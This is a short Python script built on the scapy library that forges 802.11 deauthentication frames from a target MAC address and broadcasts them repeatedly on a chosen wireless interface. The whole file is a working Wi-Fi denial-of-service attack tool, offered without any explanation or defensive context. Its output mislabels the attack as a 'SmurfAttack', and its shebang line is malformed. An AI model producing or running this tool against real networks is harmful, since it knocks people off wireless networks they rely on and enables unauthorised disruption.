#/ /usr/bin/env python3
from scapy.all import *
from scapy import *
import sys

def WifiDeath(MACtarget , count , Interface):
    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=MACtarget,addr3=MACtarget)
    pyload = RadioTap()/packet/Dot11Deauth(reason=7)
    i=0
    for i in range(int(count)):  
        sendp(pyload , inter=1.0,iface=Interface,verbose=1)
        i+=1
        print(f"\033[41m PACKET \033[0m send SmurfAttack \033[31m{MACtarget}\033[0m count \033[31m{i}\033[0m")

WifiDeath(MACtarget=sys.argv[1],count=sys.argv[2],Interface=sys.argv[3])
